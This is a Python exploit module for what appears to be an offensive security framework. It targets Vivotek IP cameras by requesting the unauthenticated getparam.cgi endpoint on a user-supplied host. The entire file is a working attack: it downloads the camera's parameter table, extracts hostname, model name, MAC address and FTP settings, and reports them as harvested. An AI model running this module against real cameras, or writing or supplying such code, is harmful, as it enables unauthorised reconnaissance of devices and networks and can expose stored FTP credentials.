import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "vivotek/param_disclosure_attack"
        self.description = "Exploit module to extract core network layout and device configurations from Vivotek cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/viewer/getparam.cgi"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/viewer/getparam.cgi"
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Downloading Vivotek parameters configuration table...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "system." in response.text:
                    lines = response.text.splitlines()
                    metadata = []
                    
                    # Extraction sélective pour un affichage propre dans la console
                    for line in lines:
                        if any(k in line for k in ["system.hostname", "system.modelname", "network.macaddress", "network.ftp"]):
                            metadata.append(line.strip())
                            
                    formatted_output = " || ".join(metadata) if metadata else response.text[:300] + "..."
                    return {
                        "success": True,
                        "details": f"Vivotek metadata harvested successfully: {formatted_output}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but target framework rejected data delivery."}
